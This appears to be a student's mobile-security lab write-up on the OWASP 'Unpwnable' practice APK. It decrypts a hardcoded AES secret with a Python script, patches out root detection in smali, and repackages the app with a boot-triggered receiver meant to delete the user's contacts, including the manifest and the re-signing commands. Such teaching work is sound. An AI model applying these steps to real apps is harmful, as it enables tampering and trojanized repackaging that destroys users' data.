# Task 1 and Task 2
- The APK was decompiled using apktool:
```
apktool d Unpwnable.apk -o Unpwnable_decoded
```
- We searched for the output message `"This is the correct secret."` using:
```
grep -r "This is the correct secret" Unpwnable_decoded/
```
- This led us to `MainActivity.smali`.
![[Pasted image 20250701223559.png]]
- This returned 
```
Unpwnable_decoded/smali/sg/vantagepoint/unpwnable1/MainActivity.smali
```
- We opened this file and looked at the context around the string. We found that this message is shown when the user enters the correct secret. Just before the message is printed, the app calls a method to validate the input:
```
invoke-static {p1}, Lsg/vantagepoint/unpwnable1/a;->a(Ljava/lang/String;)Z
```
- this calls a static method that checks whether the input string is correct.
![[Pasted image 20250702145047.png]]


- We opened
```
smali/sg/vantagepoint/unpwnable1/a.smali
```
- we got this
```
# direct methods
.method public static a(Ljava/lang/String;)Z
```
- This is a static method named `a`, which:
    - Takes **1 parameter**: a `String` (`p0`)
    - Returns a **boolean** (`Z` = boolean in smali)
## Step-by-step explanation
- Define key and encrypted secret
```
const-string v0, "8d127684cbc37c17616d806cf50473cc"
const-string v1, "5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc="
```
    - `v0` ← AES key (in hex) 
    - `v1` ← Encrypted message (Base64)
- Decode the Base64 string
```
invoke-static {v1, v2}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B
move-result-object v1
```

     - Base64 decode `v1`
     - Store raw bytes in `v1` → this is the **ciphertext**
- Try decryption
```
:try_start_0
invoke-static {v0}, Lsg/vantagepoint/unpwnable1/a;->b(Ljava/lang/String;)[B
move-result-object v0
```

     - Call method `b()` to convert the hex string (`v0`) into a byte array
     - Call another method to **decrypt** the ciphertext (`v1`) using the key (`v0`)
     - Result is a **decrypted byte array**
- Then, the code calls:
```
invoke-static {v0, v1}, Lsg/vantagepoint/a/a;->a([B[B)[B
```
![[Pasted image 20250702152003.png]]
- Inside that method:
![[Pasted image 20250702152120.png]]
- **AES is used**:
- AES/ECB/PKCS5Padding
- Now We wrote a Python script using `pycryptodome` to decrypt the ciphertext
```
from Crypto.Cipher import AES
import base64
import binascii

# Step 1: Hardcoded values from smali
key_hex = "8d127684cbc37c17616d806cf50473cc"
cipher_base64 = "5UJiFctbmgbDoLXmpL12mkno8HT4Lv8dlat8FxR2GOc="

# Step 2: Convert to bytes
key = binascii.unhexlify(key_hex)              # AES key in bytes
ciphertext = base64.b64decode(cipher_base64)   # Decode base64 to get raw encrypted data

# Step 3: Create cipher and decrypt
cipher = AES.new(key, AES.MODE_ECB)
plaintext = cipher.decrypt(ciphertext)

# Step 4: Decode and print result
try:
    print("✅ Secret:", plaintext.decode("utf-8").rstrip("\x07").rstrip("\x00"))
except UnicodeDecodeError:
    print("❌ Could not decode. Raw bytes:", plaintext)
```
![[Pasted image 20250702152345.png]]
![[Pasted image 20250702152724.png]]

## Difference Between Static and virtual .
![[Pasted image 20250702145337.png]]
# Task 3 
## Observing the Root Behavior
![[Pasted image 20250702161537.png]]
## Reverse Engineering the APK
- To analyze the application's logic
```
apktool d Unpwnable.apk -o Unpwnable_decoded
```
- We searched for the output message `"Detect."` using:
```
grep -r "detect" Unpwnable_decoded/
```
- and we got this
![[Pasted image 20250702161828.png]]
- This is where the main root detection logic resides.
## Identifying Root Detection Logic
![[Pasted image 20250702161933.png]]
- We examined the `onCreate` method inside `MainActivity.smali`, and found that it invokes three static methods:
```
invoke-static {}, Lsg/vantagepoint/a/c;->a()Z
invoke-static {}, Lsg/vantagepoint/a/c;->b()Z
invoke-static {}, Lsg/vantagepoint/a/c;->c()Z
```
- These methods perform various root checks (e.g., presence of `su`, root APKs, system flags). If any of them returned true, the app displayed:
## Patching the Smali Code
- We chose the **cleanest method**: adding a forced jump to bypass the entire root check.
- Inside `onCreate` (just after `.locals 1`), we added:
```
goto :cond_1
```
- Which skips over all root-checking conditions and jumps to the normal logic.
## Repackaging and Re-signing
- We rebuilt and signed the APK using `apktool` and `apksigner`
```
apktool b Unpwnable_decoded -o Unpwnable-RootOK-unsigned.apk
```

```
apksigner sign --ks ~/.android/debug.keystore \
  --ks-pass pass:android --key-pass pass:android \
  --out Unpwnable-RootOK.apk \
  Unpwnable-RootOK-unsigned.apk
```

## Verifying the Patch
```
adb uninstall owasp.app.unpwnable1
adb install Unpwnable-RootOK.apk
adb shell am start -n owasp.app.unpwnable1/sg.vantagepoint.unpwnable1.MainActivity
```
- on a rooted device we can see no root detected
![[Pasted image 20250702164042.png]]

# Task 4
## Implementation Steps
- Step 1: Create BroadcastReceiver in Android Studio
![[Pasted image 20250702165202.png]]
- Update the `AndroidManifest.xml`
```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <!-- Permissions required for the malicious functionality -->
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.WRITE_CONTACTS" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />

    <application
        android:allowBackup="true"
        android:dataExtractionRules="@xml/data_extraction_rules"
        android:fullBackupContent="@xml/backup_rules"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:roundIcon="@mipmap/ic_launcher_round"
        android:supportsRtl="true"
        android:theme="@style/Theme.Android"
        tools:targetApi="31">

        <!-- Registration for the malicious BroadcastReceiver -->
        <receiver
            android:name=".DeleteContactsReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>

    </application>

</manifest>
```
- Build the APK to extract the smali code for this file.
![[Pasted image 20250702165608.png]]
```
apktool d app-debug.apk -o app-debug-smali
```
- then copy the smali code 
![[Pasted image 20250702165821.png]]
- **Update `AndroidManifest.xml`**
```
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="owasp.app.unpwnable1"
    platformBuildVersionCode="27"
    platformBuildVersionName="8.1.0">

    <!-- Permissions -->
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>

    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/AppTheme">

        <!-- Main launcher activity -->
        <activity
            android:name="sg.vantagepoint.unpwnable1.MainActivity"
            android:label="@string/app_name">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>

        <!-- Broadcast Receiver for BOOT_COMPLETED -->
        <receiver android:name="com.evil.android.DeleteContactsReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>

    </application>

</manifest>
```
- Rebuild the Modified App
```
apktool b Unpawnable_decoded -o Unpwnable-DeleteAll-unsigned.apk
```
- Sign the APK
```
apksigner sign --ks ~/.android/debug.keystore \
  --ks-pass pass:android \
  --key-pass pass:android \
  --out Unpwnable-DeleteAll.apk \
  Unpwnable-DeleteAll-unsigned.apk
```
- **Install and Test**
```
adb uninstall owasp.app.unpwnable1
adb install -r Unpwnable-DeleteAll.apk
adb logcat -s "MaliciousReceiver"
```
![[Pasted image 20250701233605.png]]
